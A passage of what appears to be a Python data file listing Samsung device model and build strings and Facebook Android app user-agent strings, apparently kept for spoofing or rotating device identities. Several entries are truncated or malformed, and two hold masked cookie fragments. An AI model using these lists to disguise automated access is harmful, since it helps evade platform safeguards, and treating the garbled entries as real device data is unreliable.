    'SM-J510FN|MMB29M',
    'SM-J510FN|NMF26X',
    'SM-J320F|LMY47V',
    'GT-P5110|JDQ39',
    'GT-I9301I|KOT49H',
    'SM-A500F|LRX22G',
    'SM-G930F|NRD90M',
    'SM-T311|KOT4',
    'GT-P5200|KOT49H',
    'GT-I9301I|KOT49H',
    'SM-J320M|LMY47V',
    'SM-T531|LRX22G',
    'SM-T820|NRD90M',
    'GT-I9192|KOT49H',
    'SM-G935F|MMB29K',
    'SM-J701F|NRD90M;',
    'GT-I9301I|KOT4',
    'SM-J320FN|LMY47V',
    'SM-T111|JDQ39',
    'SM-A500F|MMB29M',
    'SM-J510FN|NMF2',
    'SM-T705|LRX22G',
    'SM-G920F|NRD90M',
    'GT-N5100|JZO54K',
    'GT-I9300I|KTU84P',
    'GT-I9300I|KTU84P',
    'GT-N8000|KOT49H',
    'GT-N8000|KOT49H',
    'SM-A500F|MMB29M',
    'GT-I9190|KOT49H',
    'SM-J510FN|NMF26X',
    'SM-J320F|LMY47V',
    'GT-P5100|JDQ39',
    'GT-I9300I|KTU84P',
    'GT-N5100|JZO54K',
    'GT-N8000|KOT49H',
    'GT-I9500|LRX22C',
    'SM-J320FN|LMY47V',
    'SM-A500F|MMB29M',
    'GT-N8000|JZO54K',
    'SM-T805|LRX22G',
    'SM-T231|KOT49H',
    'GT-N5100|JZO54K',
    'SM-J320H|LMY47V',
    'SM-T231|KOT49H',
    'SM-G930F|NRD90M',
    'SM-G935F|NRD90M',
    'SM-T310|KOT49H',
    'GT-N8000|KOT49H',
    'GT-I9300I|KTU84P',
    'SM-G920F|NRD90M',
    'SM-J510FN|NMF26X',
    'SM-T705|LRX22G;',
    'GT-P3110|JZO54K',
    'GT-I9192|KOT49H',
    'SM-J320F|LMY47V',
    'SM-G920F|NRD90M',
    'GT-I9300|IMM76D',
    'SM-G950F|NRD90M',
    'SM-J320F|LMY47V',
    'SM-J510FN|NMF26X;',
    'SM-J701F|NRD90M',
    'SM-A500F|LRX22G',
    'SM-T231|KOT49H',
    'SM-T311|KOT49H',
    'SM-J320FN|LMY47V',
    'GT-P5210|KOT49H',
    'SM-T805|LRX22G',
    'GT-I9500|LRX22C',
    'GT-P5200|KOT49H',
    'GT-I9301I|KOT49H',
    'GT-I9300|JSS15J',
    'GT-N7100|KOT49H',
    'SM-T531|LRX22G',
    'SM-T820|NRD90M',
    'SM-T315|JDQ39',
    'SM-J320F|LMY47V',
    'GT-I9190|KOT49H',
    'GT-P5220|JDQ39',
    'SM-T525|KOT49H',
    'SM-T555|LRX22G',
    'GT-I9190|KOT49H',
    'SM-J510FN|NMF26X;',
    'SM-A500F|MMB29M',
    'GT-I9192|KOT49H',
    'GT-P5100|JDQ',
    'SM-T311|KOT49H']
gt = [
    'GT-1015',
    'GT-1020',
    'GT-1030',
    'GT-1035',
    'GT-1040',
    'GT-1045',
    'GT-1050',
    'GT-1240',
    'GT-1440',
    'GT-1450',
    'GT-18190',
    'GT-18262',
    'GT-19060I',
    'GT-19082',
    'GT-19083',
    'GT-19105',
    'GT-19152',
    'GT-19192',
    'GT-19300',
    'GT-19505',
    'GT-2000',
    'GT-20000',
    'GT-200s',
    'GT-3000',
    'GT-414XOP',
    'GT-6918',
    'GT-7010',
    'GT-7020',
    'GT-7030',
    'GT-7040',
    'GT-7050',
    'GT-7100',
    'GT-7105',
    'GT-7110',
    'GT-7205',
    'GT-7210',
    'GT-7240R',
    'GT-7245',
    'GT-7303',
    'GT-7310',
    'GT-7320',
    'GT-7325',
    'GT-7326',
    'GT-7340',
    'GT-7405',
    'GT-7550\t5GT-8005',
    'GT-8010',
    'GT-81',
    'GT-810',
    'GT-8105',
    'GT-8110',
    'GT-8220S',
    'GT-8410',
    'GT-9300',
    'GT-9320',
    'GT-93G',
    'GT-A7100',
    'GT-A9500',
    'GT-ANDROID',
    'GT-B2710',
    'GT-B5330',
    'GT-B5330B',
    'GT-B5330L',
    'GT-B5330ZKAINU',
    'GT-B5510',
    'GT-B5512',
    'GT-B5722',
    'GT-B7510',
    'GT-B7722',
    'GT-B7810',
    'GT-B9150',
    'GT-B9388',
    'GT-C3010',
    'GT-C3262',
    'GT-C3310R',
    'GT-C3312',
    'GT-C3312R',
    'GT-C3313T',
    'GT-C3322',
    'GT-C3322i',
    'GT-C3520',
    'GT-C3520I',
    'GT-C3592',
    'GT-C3595',
    'GT-C3782',
    'GT-C6712',
    'GT-E1282T',
    'GT-E1500',
    'GT-E2200',
    'GT-E2202',
    'GT-E2250',
    'GT-E2252',
    'GT-E2600',
    'GT-E2652W',
    'GT-E3210',
    'GT-E3309',
    'GT-E3309I',
    'GT-E3309T',
    'GT-G530H',
    'GT-g900f',
    'GT-G930F',
    'GT-H9500',
    'GT-I5508',
    'GT-I5801',
    'GT-I6410',
    'GT-I8150',
    'GT-I8160OKLTPA',
    'GT-I8160ZWLTTT',
    'GT-I8258',
    'GT-I8262D',
    'GT-I8268',
    'GT-I8505',
    'GT-I8530BAABTU',
    'GT-I8530BALCHO',
    'GT-I8530BALTTT',
    'GT-I8550E',
    'GT-i8700',
    'GT-I8750',
    'GT-I900',
    'GT-I9008L',
    'GT-i9040',
    'GT-I9080E',
    'GT-I9082C',
    'GT-I9082EWAINU',
    'GT-I9082i',
    'GT-I9100G',
    'GT-I9100LKLCHT',
    'GT-I9100M',
    'GT-I9100P',
    'GT-I9100T',
    'GT-I9105UANDBT',
    'GT-I9128E',
    'GT-I9128I',
    'GT-I9128V',
    'GT-I9158P',
    'GT-I9158V',
    'GT-I9168I',
    'GT-I9192I',
    'GT-I9195H',
    'GT-I9195L',
    'GT-I9250',
    'GT-I9303I',
    'GT-I9305N',
    'GT-I9308I',
    'GT-I9505G',
    'GT-I9505X',
    'GT-I9507V',
    'GT-I9600',
    'GT-m190',
    'GT-M5650',
    'GT-mini',
    'GT-N5000S',
    'GT-N5100',
    'GT-N5105',
    'GT-N5110',
    'GT-N5120',
    'GT-N7000B',
    'GT-N7005',
    'GT-N7100T',
    'GT-N7102',
    'GT-N7105',
    'GT-N7105T',
    'GT-N7108',
    'GT-N7108D',
    'GT-N8000',
    'GT-N8005',
    'GT-N8010',
    'GT-N8020',
    'GT-N9000',
    'GT-N9505',
    'GT-P1000CWAXSA',
    'GT-P1000M',
    'GT-P1000T',
    'GT-P1010',
    'GT-P3100B',
    'GT-P3105',
    'GT-P3108',
    'GT-P3110',
    'GT-P5100',
    'GT-P5200',
    'GT-P5210XD1',
    'GT-P5220',
    'GT-P6200',
    'GT-P6200L',
    'GT-P6201',
    'GT-P6210',
    'GT-P6211',
    'GT-P6800',
    'GT-P7100',
    'GT-P7300',
    'GT-P7300B',
    'GT-P7310',
    'GT-P7320',
    'GT-P7500D',
    'GT-P7500M',
    'GT-P7500R',
    'GT-P7500V',
    'GT-P7501',
    'GT-P7511',
    'GT-S3330',
    'GT-S3332',
    'GT-S3333',
    'GT-S3370',
    'GT-S3518',
    'GT-S3570',
    'GT-S3600i',
    'GT-S3650',
    'GT-S3653W',
    'GT-S3770K',
    'GT-S3770M',
    'GT-S3800W',
    'GT-S3802',
    'GT-S3850',
    'GT-S5220',
    'GT-S5220R',
    'GT-S5222',
    'GT-S5230',
    'GT-S5230W',
    'GT-S5233T',
    'GT-s5233w',
    'GT-S5250',
    'GT-S5253',
    'GT-s5260',
    'GT-S5280',
    'GT-S5282',
    'GT-S5283B',
    'GT-S5292',
    'GT-S5300',
    'GT-S5300L',
    'GT-S5301',
    'GT-S5301B',
    'GT-S5301L',
    'GT-S5302',
    'GT-S5302B',
    'GT-S5303',
    'GT-S5303B',
    'GT-S5310',
    'GT-S5310B',
    'GT-S5310C',
    'GT-S5310E',
    'GT-S5310G',
    'GT-S5310I',
    'GT-S5310L',
    'GT-S5310M',
    'GT-S5310N',
    'GT-S5312',
    'GT-S5312B',
    'GT-S5312C',
    'GT-S5312L',
    'GT-S5330',
    'GT-S5360',
    'GT-S5360B',
    'GT-S5360L',
    'GT-S5360T',
    'GT-S5363',
    'GT-S5367',
    'GT-S5369',
    'GT-S5380',
    'GT-S5380D',
    'GT-S5500',
    'GT-S5560',
    'GT-S5560i',
    'GT-S5570B',
    'GT-S5570I',
    'GT-S5570L',
    'GT-S5578',
    'GT-S5600',
    'GT-S5603',
    'GT-S5610',
    'GT-S5610K',
    'GT-S5611',
    'GT-S5620',
    'GT-S5670',
    'GT-S5670B',
    'GT-S5670HKBZTA',
    'GT-S5690',
    'GT-S5690R',
    'GT-S5830',
    'GT-S5830D',
    'GT-S5830G',
    'GT-S5830i',
    'GT-S5830L',
    'GT-S5830M',
    'GT-S5830T',
    'GT-S5830V',
    'GT-S5831i',
    'GT-S5838',
    'GT-S5839i',
    'GT-S6010',
    'GT-S6010BBABTU',
    'GT-S6012',
    'GT-S6012B',
    'GT-S6102',
    'GT-S6102B',
    'GT-S6293T',
    'GT-S6310B',
    'GT-S6310ZWAMID',
    'GT-S6312',
    'GT-S6313T',
    'GT-S6352',
    'GT-S6500',
    'GT-S6500D',
    'GT-S6500L',
    'GT-S6790',
    'GT-S6790L',
    'GT-S6790N',
    'GT-S6792L',
    'GT-S6800',
    'GT-S6800HKAXFA',
    'GT-S6802',
    'GT-S6810',
    'GT-S6810B',
    'GT-S6810E',
    'GT-S6810L',
    'GT-S6810M',
    'GT-S6810MBASER',
    'GT-S6810P',
    'GT-S6812',
    'GT-S6812B',
    'GT-S6812C',
    'GT-S6812i',
    'GT-S6818',
    'GT-S6818V',
    'GT-S7230E',
    'GT-S7233E',
    'GT-S7250D',
    'GT-S7262',
    'GT-S7270',
    'GT-S7270L',
    'GT-S7272',
    'GT-S7272C',
    'GT-S7273T',
    'GT-S7278',
    'GT-S7278U',
    'GT-S7390',
    'GT-S7390G',
    'GT-S7390L',
    'GT-S7392',
    'GT-S7392L',
    'GT-S7500',
    'GT-S7500ABABTU',
    'GT-S7500ABADBT',
    'GT-S7500ABTTLP',
    'GT-S7500CWADBT',
    'GT-S7500L',
    'GT-S7500T',
    'GT-S7560',
    'GT-S7560M',
    'GT-S7562',
    'GT-S7562C',
    'GT-S7562i',
    'GT-S7562L',
    'GT-S7566',
    'GT-S7568',
    'GT-S7568I',
    'GT-S7572',
    'GT-S7580E',
    'GT-S7583T',
    'GT-S758X',
    'GT-S7592',
    'GT-S7710',
    'GT-S7710L',
    'GT-S7898',
    'GT-S7898I',
    'GT-S8500',
    'GT-S8530',
    'GT-S8600',
    'GT-STB919',
    'GT-T140',
    'GT-T150',
    'GT-V8a',
    'GT-V8i',
    'GT-VC818',
    'GT-VM919S',
    'GT-W131',
    'GT-W153',
    'GT-X831',
    'GT-X853',
    'GT-X870',
    'GT-X890',
    'GT-Y8750']
ua = [
    'HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320) UP.Link/6.3.0.0.0']
ua = [
    'HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320']
ua = [
    'com.mobile.indiapp 2.0.5.5 phone HTC7088 android 16 fa zz normal long high 540 960']
ua = [
    'Mogujie4Android/NAMhuawei/1290']
ua = [
    'Dalvik\\/2.1.0 (Linux; U; Android 5.0.1; GT-I9505 Build\\/LRX22C) [FBAN\\/Orca-Android;FBAV\\/130.0.0.15.89;FBPN\\/com.facebook.orca;FBLC\\/sv_SE;FBBV\\/67467545;FBCR\\/S COMVIQ;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/GT-I9505;FBSV\\/5.0.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=1920};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build\\/R16NW) [FBAN\\/FB4A;FBAV\\/187.0.0.43.81;FBPN\\/com.facebook.katana;FBLC\\/fr_FR;FBBV\\/122388438;FBCR\\/Bouygues Telecom;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G930F;FBSV\\/8.0.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,h',
    'Dalvik\\/9.1.0 (Linux; U; Android 9.0.1; SM-J210F Build\\/MMB29Q) Source\\/1 [FBAN\\/EMA;UNITY_PACKAGE\\/342;FBBV\\/107586706;FBAV\\/99.0.0.8.182;FBDV\\/SM-J210F;FBLC\\/en_US;FBOP\\/20]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build\\/R16NW) [FBAN\\/Orca-Android;FBAV\\/196.0.0.29.99;FBPN\\/com.facebook.orca;FBLC\\/th_TH;FBBV\\/135374479;FBCR\\/AIS;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A720F;FBSV\\/8.0.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=1920};FB_FW\\/1;]',
    'Dalvik\\/1.6.0 (Linux; U; Android 4.4.4; Z987 Build\\/KTU84P) [FBAN\\/Orca-Android;FBAV\\/44.0.0.8.52;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/16048044;FBCR\\/cricket;FBMF\\/zte;FBBD\\/zte;FBDV\\/Z987;FBSV\\/4.4.4;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1184};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; SM-G950U Build\\/R16NW) [FBAN\\/Orca-Android;FBAV\\/220.0.0.20.121;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/159507260;FBCR\\/MegaFon;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G950U;FBSV\\/8.0.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=4.0,width=1440,height=2768};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 5.1.1; SM-G925F Build\\/JLS36C) [FBAN\\/FB4A;FBAV\\/175.0.0.40.97;FBPN\\/com.facebook.katana;FBLC\\/vi_VN;FBBV\\/111983758;FBCR\\/Viettel Telecom;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G925F;FBSV\\/5.1.1;FBCA\\/x86:armeabi-v7a;FBDM\\/{density=1.5,width=1280,height=720};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.1.2; SM-N9005 Build\\/NJH47F) [FBAN\\/Orca-Android;FBAV\\/230.0.0.12.117;FBPN\\/com.facebook.orca;FBLC\\/en_EG;FBBV\\/169378254;FBCR\\/Android;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-N9005;FBSV\\/7.1.2;FBCA\\/x86:armeabi-v7a;FBDM\\/{density=1.5,width=720,height=1280};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build\\/O11019) [FBAN\\/Orca-Android;FBAV\\/241.0.0.17.116;FBPN\\/com.facebook.orca;FBLC\\/th_TH;FBBV\\/182747440;FBCR\\/TRUE-H;FBMF\\/OPPO;FBBD\\/OPPO;FBDV\\/CPH1909;FBSV\\/8.1.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=1424,height=720};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-A205GN Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/242.0.0.15.119;FBPN\\/com.facebook.orca;FBLC\\/en_PH;FBBV\\/184324652;FBCR\\/TM;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A205GN;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-A505GN Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/241.0.0.17.116;FBPN\\/com.facebook.orca;FBLC\\/en_PH;FBBV\\/182747450;FBCR\\/GLOBE;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A505GN;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.625,width=1080,height=2131};FB_FW\\/1;] FBBK\\/1 Cookie VaHe******************** Edit',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-A505GN Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/241.0.0.17.116;FBPN\\/com.facebook.orca;FBLC\\/en_PH;FBBV\\/182747450;FBCR\\/GLOBE;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A505GN;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.625,width=1080,height=2131};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-A205GN Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/242.0.0.15.119;FBPN\\/com.facebook.orca;FBLC\\/en_PH;FBBV\\/184324652;FBCR\\/TM;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A205GN;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.75,width=720,height=1423};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-A205GN Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/242.0.0.15.119;FBPN\\/com.facebook.orca;FBLC\\/en_PH;FBBV\\/184324652;FBCR\\/TM;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A205GN;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.75,width=720,height=1423};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; AGS2-L09 Build\\/HUAWEIAGS2-L09) [FBAN\\/Orca-Android;FBAV\\/238.0.0.14.120;FBPN\\/com.facebook.orca;FBLC\\/hu_HU;FBBV\\/179092826;FBCR\\/null;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/AGS2-L09;FBSV\\/8.0.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=1200,height=1852};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build\\/OPM1.171019.019) [FBAN\\/Orca-Android;FBAV\\/244.0.0.16.236;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/187555057;FBCR\\/null;FBMF\\/LGE;FBBD\\/lge;FBDV\\/LML713DL;FBSV\\/8.1.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.625,width=1080,height=2034};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; CPH1987 Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/244.0.0.16.236;FBPN\\/com.facebook.orca;FBLC\\/vi_VN;FBBV\\/187555175;FBCR\\/VIETTEL;FBMF\\/OPPO;FBBD\\/OPPO;FBDV\\/CPH1987;FBSV\\/9;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=2196};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.0; Hisense Hi  3 Build\\/NRD9OM) [FBAN\\/FB4A;FBAV\\/245.0.0.39.118;FBPN\\/ com.facebook.katana;FBLC\\/es_MX;FBBV\\/ 180475968;FBCR\\/TELCEL;FBMF\\/Hisense;FBBD\\/ Hisense;FBDV\\/Hisense Hi 3;FBSV\\/7.0;FBCA\\/armeabi- v7a:armeabi;FBDM\\/ {density=2.0,width=720height=1280};FB_FW\\/1;FBRV\\/181817659;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.0; SM-G930F Build\\/NRD90M) [FBAN\\/Orca-Android;FBAV\\/247.0.0.10.117',
    'Dalvik\\/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build\\/LMY47V) [FBAN\\/Orca-Android;FBAV\\/233.0.0.16.158;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/172917909;FBCR\\/null;FBMF\\/vivo;FBBD\\/vivo;FBDV\\/vivo V3Max;FBSV\\/5.1.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=1920',
    'Dalvik\\/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build\\/LMY47V) [FBAN\\/Orca-Android;FBAV\\/233.0.0.16.158;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/172917909;FBCR\\/null;FBMF\\/vivo;FBBD\\/vivo;FBDV\\/vivo V3Max;FBSV\\/5.1.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=1920};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; POT-LX1 Build\\/HUAWEIPOT-L01) [FBAN\\/Orca-Android;FBAV\\/251.0.0.12.117;FBPN\\/com.facebook.orca;FBLC\\/en_GB;FBBV\\/197803941;FBCR\\/O2-CZ;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/POT-LX1;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.0,width=720,height=1426};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; SM-N975U Build\\/QP1A.190711.020) [FBAN\\/Orca-Android;FBAV\\/253.0.0.17.117;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/200372525;FBCR\\/U.S. Cellular;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-N975U;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.5,width=1440,height=2759};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; SM-N960F Build\\/QP1A.190711.020) [FBAN\\/Orca-Android;FBAV\\/257.1.0.21.120;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/205865103;FBCR\\/null;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-N960F;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.625,width=1080,height=2094};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; moto e6 Build\\/PCB29.73-65-3) [FBAN\\/Orca-Android;FBAV\\/235.1.0.9.122;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/175782189;FBCR\\/Metro by T-Mobile;FBMF\\/motorola;FBBD\\/motorola;FBDV\\/moto e6;FBSV\\/9;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1344};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-G955F Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/255.0.0.14.126;FBPN\\/com.facebook.orca;FBLC\\/en_PH;FBBV\\/202766316;FBCR\\/SUN;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G955F;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.5,width=1440,height=2960};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-G955F Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/255.0.0.14.126;FBPN\\/com.facebook.orca;FBLC\\/en_PH;FBBV\\/202766316;FBCR\\/SUN;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G955F;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.1.0; DRA-LX2 Build\\/HUAWEIDRA-LX2) [FBAN\\/Orca-Android;FBAV\\/239.1.0.17.119;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/180535023;FBCR\\/TelkomSA;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/DRA-LX2;FBSV\\/8.1.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1356};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.1.1; E6653 Build\\/32.4.A.1.54) [FBAN\\/Orca-Android;FBAV\\/151.0.0.17.95;FBPN\\/com.facebook.orca;FBLC\\/en_ZA;FBBV\\/89897644;FBCR\\/null;FBMF\\/Sony;FBBD\\/Sony;FBDV\\/E6653;FBSV\\/7.1.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=1776};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/1.6.0 (Linux; U; Android 4.0.4; GT-I9300 Build\\/IMM76D) [FBAN\\/\\xC2\\xADOrca-Android;FBAV\\/\\xC2\\xAD5.0.0.16.1;FBLC\\/\\xC2\\xADtr_TR;FBBV\\/\\xC2\\xAD2302400;FBCR\\/\\xC2\\xADT-Mobile;FBMF\\/\\xC2\\xADsamsung;FBBD\\/\\xC2\\xADsamsung;FBDV\\/\\xC2\\xADGT-I9300;FBSV\\/\\xC2\\xAD4.0.4;FBCA\\/\\xC2\\xADarmeabi-v7a:armeabi;F\\xC2\\xADBDM\\/\\xC2\\xAD{density=1.0,width=10\\xC2\\xAD66,height=552};]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; SM-G970U1 Build\\/QP1A.190711.020) [FBAN\\/MessengerLite;FBAV\\/78.0.1.18.236;FBPN\\/com.facebook.mlite;FBLC\\/es_MX;FBBV\\/201616056;FBCR\\/TELCEL;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G970U1;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2020};]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; POT-LX3 Build\\/HUAWEIPOT-L03) [FBAN\\/Orca-Android;FBAV\\/270.0.0.17.120;FBPN\\/com.facebook.orca;FBLC\\/es_MX;FBBV\\/225129965;FBCR\\/TELCEL;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/POT-LX3;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2139};FB_FW\\/1;] Cookie yQHE********************',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.1.2; KFMUWI Build\\/NS6315) [FBAN\\/Orca-Android;FBAV\\/235.1.0.9.122;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/175782190;FBCR\\/null;FBMF\\/Amazon;FBBD\\/Amazon;FBDV\\/KFMUWI;FBSV\\/7.1.2;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.0,width=600,height=976};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; Pixel 3 Build\\/QQ3A.200605.001) [FBAN\\/Orca-Android;FBAV\\/271.0.0.11.120;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/227270208;FBCR\\/Verizon;FBMF\\/Google;FBBD\\/google;FBDV\\/Pixel 3;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.75,width=1080,height=2028};FB_FW\\/1;] FBBK\\/1\\',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; VOG-L29 Build\\/HUAWEIVOG-L29) [FBAN\\/Orca-Android;FBAV\\/272.0.0.14.119;FBPN\\/com.facebook.orca;FBLC\\/es_ES;FBBV\\/228977692;FBCR\\/vodafone ES;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/VOG-L29;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2265};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; moto e5 plus Build\\/OPPS27.91-179-8-16) [FBAN\\/FB4A;FBAV\\/287.0.0.50.119;FBPN\\/com.facebook.katana;FBLC\\/es_MX;FBBV\\/243660864;FBCR\\/null;FBMF\\/motorola;FBBD\\/motorola;FBDV\\/moto e5 plus;FBSV\\/8.0.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.7,width=720,height=1358};FB_FW\\/1;FBRV\\/0;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-J730F Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/282.0.0.10.119;FBPN\\/com.facebook.orca;FBLC\\/pl_PL;FBBV\\/245106334;FBCR\\/Plus;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-J730F;FBSV\\/9;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.625,width=1080,height=1920};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; SM-A505GT Build\\/QP1A.190711.020) [FBAN\\/Orca-Android;FBAV\\/282.0.0.10.119;FBPN\\/com.facebook.orca;FBLC\\/pt_BR;FBBV\\/245106389;FBCR\\/Claro BR;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A505GT;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2113};FB_FW\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; SM-A505GT Build\\/QP1A.190711.020) [FBAN\\/Orca-Android;FBAV\\/282.0.0.10.119;FBPN\\/com.facebook.orca;FBLC\\/pt_BR;FBBV\\/245106389;FBCR\\/Claro BR;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A505GT;FBSV\\/10;FBCA\\/arm64-',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; Redmi Note 7 MIUI\\/V11.0.1.0.QFGEUXM) [FBAN\\/Orca-Android;FBAV\\/282.0.0.10.119;FBPN\\/com.facebook.orca;FBLC\\/cs_CZ;FBBV\\/245106389;FBCR\\/null;FBMF\\/Xiaomi;FBBD\\/xiaomi;FBDV\\/Redmi Note 7;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.75,width=1080,height=2131};FB_FW\\/1;] FBBK\\/1',
